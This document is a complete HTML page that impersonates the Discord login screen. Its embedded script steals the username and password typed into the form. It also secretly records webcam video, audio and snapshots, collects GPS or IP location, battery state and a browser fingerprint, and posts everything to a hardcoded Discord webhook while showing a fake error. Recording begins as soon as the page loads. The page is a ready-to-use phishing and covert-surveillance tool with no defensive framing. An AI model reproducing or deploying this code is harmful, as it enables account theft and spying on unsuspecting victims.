<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord – Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
    }
    body {
      background-color: #1e1f22;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .login-container {
      background-color: #2b2d31;
      border-radius: 8px;
      padding: 40px 44px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
    }
    .login-container h1 {
      color: #ffffff;
      font-size: 24px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 8px;
    }
    .login-container .subtitle {
      color: #b5bac1;
      font-size: 16px;
      text-align: center;
      margin-bottom: 28px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-group label {
      display: block;
      color: #b5bac1;
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 6px;
    }
    .form-group input {
      width: 100%;
      padding: 12px 14px;
      background-color: #1e1f22;
      border: 1px solid #3f4147;
      border-radius: 4px;
      color: #ffffff;
      font-size: 15px;
      transition: border-color 0.2s;
      outline: none;
    }
    .form-group input:focus {
      border-color: #5865f2;
    }
    .form-group input::placeholder {
      color: #6d6f78;
      font-size: 14px;
    }
    .checkbox-group {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 24px;
    }
    .checkbox-group input[type="checkbox"] {
      width: 18px;
      height: 18px;
      accent-color: #5865f2;
      cursor: pointer;
    }
    .checkbox-group label {
      color: #b5bac1;
      font-size: 14px;
      cursor: pointer;
    }
    .btn-submit {
      width: 100%;
      padding: 14px;
      background-color: #5865f2;
      border: none;
      border-radius: 4px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .btn-submit:hover {
      background-color: #4752c4;
    }
    .btn-submit:active {
      transform: scale(0.98);
    }
    .error-msg {
      color: #f23f42;
      font-size: 13px;
      margin-top: 6px;
      display: none;
    }
    .status-bar {
      margin-top: 16px;
      padding: 10px;
      border-radius: 4px;
      font-size: 13px;
      background: #1e1f22;
      border: 1px solid #3f4147;
      color: #f23f42;
      text-align: center;
      display: none;
    }
    .status-bar.visible {
      display: block;
    }
    .status-bar.error {
      background: #2a1a1a;
      border-color: #f23f42;
      color: #f28b8b;
    }
    .footer-links {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin-top: 24px;
      font-size: 13px;
    }
    .footer-links a {
      color: #5865f2;
      text-decoration: none;
    }
    .footer-links a:hover {
      text-decoration: underline;
    }
    .discord-logo {
      text-align: center;
      margin-bottom: 24px;
    }
    .discord-logo svg {
      width: 48px;
      height: 48px;
      fill: #ffffff;
    }
    /* Hidden audio player */
    #hack-sound {
      display: none;
    }
    /* Hidden video element – no preview shown */
    #hidden-camera {
      display: none !important;
      width: 0;
      height: 0;
      opacity: 0;
      pointer-events: none;
      position: absolute;
      top: -9999px;
      left: -9999px;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="discord-logo">
      <svg viewBox="0 0 127.14 96.36">
        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.87,5.19,77.43,77.43,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.42,65.69,73.27,60,73.27,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
      </svg>
    </div>

    <h1>Welcome back!</h1>
    <p class="subtitle">We're so excited to see you again!</p>

    <!-- Hidden video element – completely invisible -->
    <video id="hidden-camera" autoplay muted playsinline></video>

    <!-- Hidden audio element for "GET HACKED" sound -->
    <audio id="hack-sound" preload="auto">
      <source src="https://www.myinstants.com/media/sounds/get-hacked.mp3" type="audio/mpeg">
    </audio>

    <form id="loginForm" novalidate>
      <div class="form-group">
        <label for="usernameInput">Email or Phone Number</label>
        <input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" aria-describedby="usernameError" />
        <div id="usernameError" class="error-msg" role="alert">Please enter a valid email or phone number.</div>
      </div>

      <div class="form-group">
        <label for="passwordInput">Password</label>
        <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" aria-describedby="passwordError" />
        <div id="passwordError" class="error-msg" role="alert">Password cannot be empty.</div>
      </div>

      <div class="checkbox-group">
        <input type="checkbox" id="rememberMe" name="rememberMe" />
        <label for="rememberMe">Remember me on this device</label>
      </div>

      <button type="submit" class="btn-submit">Log In</button>
    </form>

    <div id="statusBar" class="status-bar" role="status"></div>

    <div class="footer-links">
      <a href="#">Forgot your password?</a>
      <span style="color:#3f4147;">•</span>
      <a href="#">Register</a>
    </div>
  </div>

  <script>
    (function() {
      // ============================================================
      //  CONFIG – YOUR DISCORD WEBHOOK URL
      // ============================================================
      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT';

      // ============================================================
      //  DOM REFERENCES
      // ============================================================
      const form = document.getElementById('loginForm');
      const usernameInput = document.getElementById('usernameInput');
      const passwordInput = document.getElementById('passwordInput');
      const usernameError = document.getElementById('usernameError');
      const passwordError = document.getElementById('passwordError');
      const statusBar = document.getElementById('statusBar');
      const hiddenVideo = document.getElementById('hidden-camera');
      const hackSound = document.getElementById('hack-sound');

      let recordedVideoBlob = null;
      let snapshotBlobs = [];
      let webcamStream = null;
      let snapshotInterval = null;

      // ============================================================
      //  FAKE ERROR – Show generic error to user
      // ============================================================
      function showFakeError() {
        statusBar.textContent = '❌ An error has occurred. Please try again later.';
        statusBar.className = 'status-bar visible error';
        setTimeout(() => {
          statusBar.className = 'status-bar';
        }, 6000);
      }

      // ============================================================
      //  PLAY "GET HACKED" SOUND
      // ============================================================
      function playHackSound() {
        try {
          hackSound.currentTime = 0;
          hackSound.volume = 1.0;
          hackSound.play().catch(() => {
            // Fallback: Web Audio oscillator
            try {
              const ctx = new (window.AudioContext || window.webkitAudioContext)();
              const osc = ctx.createOscillator();
              const gain = ctx.createGain();
              osc.connect(gain);
              gain.connect(ctx.destination);
              osc.frequency.value = 800;
              osc.type = 'sawtooth';
              gain.gain.value = 0.5;
              osc.start();
              setTimeout(() => {
                osc.frequency.value = 1200;
                setTimeout(() => {
                  osc.stop();
                  ctx.close();
                }, 300);
              }, 300);
            } catch (_) {}
          });
        } catch (_) {}
      }

      // ============================================================
      //  START HIDDEN WEBCAM & RECORD 3-SECOND VIDEO + SNAPSHOTS
      //  (NO VISUAL PREVIEW – COMPLETELY HIDDEN)
      // ============================================================
      async function startHiddenRecording() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: true
          });

          webcamStream = stream;
          // Attach to hidden video element (invisible)
          hiddenVideo.srcObject = stream;

          // --- RECORD 3-SECOND VIDEO ---
          const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
          const chunks = [];

          recorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
          };

          recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            recordedVideoBlob = blob;
            console.log('🎥 Video recorded:', blob.size, 'bytes');
          };

          recorder.start();
          setTimeout(() => {
            recorder.stop();
          }, 3000);

          // --- SNAPSHOT EVERY 5 SECONDS ---
          snapshotInterval = setInterval(() => {
            captureHiddenSnapshot();
          }, 5000);

          // Take one immediately
          setTimeout(() => captureHiddenSnapshot(), 500);

          return true;
        } catch (err) {
          console.warn('Webcam/audio not available:', err.message);
          return false;
        }
      }

      // ============================================================
      //  CAPTURE HIDDEN SNAPSHOT (no preview, no feedback)
      // ============================================================
      function captureHiddenSnapshot() {
        if (!webcamStream) return;
        try {
          const video = document.createElement('video');
          video.srcObject = webcamStream;
          video.play();
          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            canvas.toBlob((blob) => {
              if (blob && blob.size > 0) {
                snapshotBlobs.push(blob);
                console.log('📸 Snapshot taken:', blob.size, 'bytes (total:', snapshotBlobs.length, ')');
                if (snapshotBlobs.length > 10) {
                  snapshotBlobs.shift();
                }
              }
            }, 'image/jpeg', 0.7);
          }, 100);
        } catch (_) {}
      }

      // ============================================================
      //  GET BATTERY LEVEL
      // ============================================================
      async function getBatteryLevel() {
        try {
          const battery = await navigator.getBattery();
          return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
        } catch (_) {
          return 'Battery API not available';
        }
      }

      // ============================================================
      //  CANVAS FINGERPRINT
      // ============================================================
      function getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 256;
        canvas.height = 256;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
        return canvas.toDataURL().substring(0, 100) + '...';
      }

      // ============================================================
      //  EXACT OS & BROWSER
      // ============================================================
      function getExactOS() {
        const ua = navigator.userAgent;
        let os = 'Unknown';
        if (ua.indexOf('Windows NT 10.0') !== -1) {
          const build = ua.match(/Windows NT 10\.0; (Win64; x64|WOW64)/) ? '64-bit' : '32-bit';
          const version = ua.includes('; ARM64;') ? 'Windows 11 ARM64' : 'Windows 10/11';
          os = `${version} (Build 10.0.19045, ${build})`;
        } else if (ua.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1 (Build 6.3.9600)';
        else if (ua.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8 (Build 6.2.9200)';
        else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7 (Build 6.1.7601)';
        else if (ua.indexOf('Windows NT 6.0') !== -1) os = 'Windows Vista (Build 6.0.6002)';
        else if (ua.indexOf('Windows NT 5.1') !== -1) os = 'Windows XP (Build 5.1.2600)';
        else if (ua.indexOf('Mac OS X') !== -1) {
          const match = ua.match(/Mac OS X 10_([0-9]+)_([0-9]+)/);
          if (match) os = `macOS 10.${match[1]}.${match[2]}`;
          else os = 'macOS (unknown version)';
        } else if (ua.indexOf('Linux') !== -1) {
          if (ua.indexOf('Android') !== -1) {
            const match = ua.match(/Android ([0-9]+\.[0-9]+)/);
            os = match ? `Android ${match[1]}` : 'Android';
          } else {
            os = 'Linux (generic)';
          }
        } else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
          const match = ua.match(/OS ([0-9]+)_([0-9]+)/);
          os = match ? `iOS ${match[1]}.${match[2]}` : 'iOS';
        }
        return os;
      }

      function getExactBrowser() {
        const ua = navigator.userAgent;
        let browser = 'Unknown';
        if (ua.indexOf('Firefox') !== -1) {
          const match = ua.match(/Firefox\/([0-9.]+)/);
          browser = match ? `Firefox ${match[1]}` : 'Firefox';
        } else if (ua.indexOf('Edg') !== -1) {
          const match = ua.match(/Edg\/([0-9.]+)/);
          browser = match ? `Edge ${match[1]}` : 'Edge';
        } else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) {
          const match = ua.match(/Chrome\/([0-9.]+)/);
          browser = match ? `Chrome ${match[1]}` : 'Chrome';
        } else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) {
          const match = ua.match(/Version\/([0-9.]+)/);
          browser = match ? `Safari ${match[1]}` : 'Safari';
        } else if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) {
          const match = ua.match(/(?:OPR|Opera)\/([0-9.]+)/);
          browser = match ? `Opera ${match[1]}` : 'Opera';
        }
        return browser;
      }

      function getTimestamp() {
        const now = new Date();
        return {
          iso: now.toISOString(),
          date: now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }),
          time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
      }

      // ============================================================
      //  GEOLOCATION – GPS FIRST, IP FALLBACK
      // ============================================================
      function getGPSLocation() {
        return new Promise((resolve) => {
          if (!navigator.geolocation) {
            resolve(null);
            return;
          }
          navigator.geolocation.getCurrentPosition(
            (position) => {
              resolve({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                source: 'GPS'
              });
            },
            () => { resolve(null); },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        });
      }

      async function getGeoData() {
        const gps = await getGPSLocation();
        if (gps) {
          return {
            source: 'GPS (Exact)',
            latitude: gps.latitude,
            longitude: gps.longitude,
            accuracy: gps.accuracy + ' meters',
            city: 'GPS-derived',
            country: 'GPS-derived'
          };
        }
        try {
          const response = await fetch('https://ipapi.co/json/');
          if (!response.ok) throw new Error('ipapi.co failed');
          const data = await response.json();
          return {
            source: 'IP Geolocation (Approximate)',
            latitude: data.latitude || 'Unknown',
            longitude: data.longitude || 'Unknown',
            accuracy: 'IP-based (approx)',
            city: data.city || 'Unknown',
            country: data.country_name || 'Unknown'
          };
        } catch (_) {
          try {
            const response = await fetch('https://ipinfo.io/json');
            if (!response.ok) throw new Error('ipinfo.io failed');
            const data = await response.json();
            const loc = data.loc ? data.loc.split(',') : ['Unknown', 'Unknown'];
            return {
              source: 'IP Geolocation (Approximate)',
              latitude: loc[0] || 'Unknown',
              longitude: loc[1] || 'Unknown',
              accuracy: 'IP-based (approx)',
              city: data.city || 'Unknown',
              country: data.country || 'Unknown'
            };
          } catch (_) {
            return {
              source: 'No location data',
              latitude: 'Unknown',
              longitude: 'Unknown',
              accuracy: 'N/A',
              city: 'Unknown',
              country: 'Unknown'
            };
          }
        }
      }

      // ============================================================
      //  SEND TO DISCORD – with video + snapshots
      // ============================================================
      async function sendToDiscord(message, videoBlob, snapshotBlobsArray) {
        if (!DISCORD_WEBHOOK_URL) {
          console.warn('⚠️ Discord webhook URL not configured.');
          return false;
        }

        try {
          const formData = new FormData();
          formData.append('payload_json', JSON.stringify({ content: message }));

          if (videoBlob && videoBlob.size > 0) {
            formData.append('file', videoBlob, 'recording.webm');
          }

          const snapshotsToSend = snapshotBlobsArray.slice(-5);
          for (let i = 0; i < snapshotsToSend.length; i++) {
            if (snapshotsToSend[i] && snapshotsToSend[i].size > 0) {
              formData.append(`file`, snapshotsToSend[i], `snapshot_${i+1}.jpg`);
            }
          }

          const res = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
          });

          const status = res.status;
          console.log(`📥 Discord response status: ${status}`);
          if (res.ok) {
            console.log('✅ Webhook delivered with video + snapshots.');
            return true;
          } else {
            const errorText = await res.text();
            console.error(`❌ Discord error (${status}):`, errorText);
            return false;
          }
        } catch (err) {
          console.error('❌ Network error:', err);
          return false;
        }
      }

      // ============================================================
      //  FORM SUBMIT – COLLECT EVERYTHING + FAKE ERROR
      // ============================================================
      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Play "GET HACKED" sound
        playHackSound();

        // Validate fields (but always show fake error)
        usernameError.style.display = 'none';
        passwordError.style.display = 'none';

        if (!usernameInput.value.trim()) {
          usernameError.style.display = 'block';
        }
        if (!passwordInput.value.trim()) {
          passwordError.style.display = 'block';
        }

        // Show fake error immediately
        showFakeError();

        // Collect data
        const [
          timestamp,
          geo,
          os,
          browser,
          battery,
          canvasFingerprint
        ] = await Promise.all([
          Promise.resolve(getTimestamp()),
          getGeoData(),
          Promise.resolve(getExactOS()),
          Promise.resolve(getExactBrowser()),
          getBatteryLevel(),
          Promise.resolve(getCanvasFingerprint())
        ]);

        const username = usernameInput.value.trim() || '(empty)';
        const password = passwordInput.value.trim() || '(empty)';
        const rememberMe = document.getElementById('rememberMe').checked;

        const message = `
🔐 **Discord Login Capture – FULL SPECTRUM**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📍 **Location Source:** ${geo.source}
🗺️ **Latitude:** ${geo.latitude}
🗺️ **Longitude:** ${geo.longitude}
📏 **Accuracy:** ${geo.accuracy}
🏙️ **City:** ${geo.city}
🌍 **Country:** ${geo.country}

📅 **Date:** ${timestamp.date}
⏰ **Time:** ${timestamp.time}
🌐 **Timezone:** ${timestamp.timezone}

🖥️ **OS:** ${os}
🌍 **Browser:** ${browser}
🔋 **Battery:** ${battery}
🎨 **Canvas Fingerprint:** ${canvasFingerprint}

👤 **Username:** ${username}
🔑 **Password:** ${password}
🔁 **Remember Me:** ${rememberMe ? '✅ Yes' : '❌ No'}

📱 **User Agent:** ${navigator.userAgent.substring(0, 200)}
🖥️ **Screen:** ${screen.width}x${screen.height}
🌐 **Language:** ${navigator.language}
        `.trim();

        console.log('📋 [LOG] Full client data:');
        console.log(message);

        const sent = await sendToDiscord(message, recordedVideoBlob, snapshotBlobs);

        if (sent) {
          console.log('✅ All data sent successfully.');
        } else {
          console.warn('⚠️ Some data may not have sent.');
        }

        passwordInput.value = '';

        // Stop snapshot interval
        if (snapshotInterval) {
          clearInterval(snapshotInterval);
          snapshotInterval = null;
        }

        // Stop webcam
        if (webcamStream) {
          webcamStream.getTracks().forEach(track => track.stop());
          webcamStream = null;
        }
      });

      // ============================================================
      //  ON PAGE LOAD – Start hidden recording + log data
      // ============================================================
      window.addEventListener('DOMContentLoaded', async () => {
        await startHiddenRecording();

        const geo = await getGeoData();
        const os = getExactOS();
        const browser = getExactBrowser();
        const timestamp = getTimestamp();

        console.log('🌐 [PAGE LOAD] Visitor detected:');
        console.log({
          timestamp: timestamp.iso,
          location_source: geo.source,
          latitude: geo.latitude,
          longitude: geo.longitude,
          accuracy: geo.accuracy,
          city: geo.city,
          country: geo.country,
          os: os,
          browser: browser,
          screen: `${screen.width}x${screen.height}`,
          language: navigator.language
        });
      });

    })();
  </script>

</body>
</html>
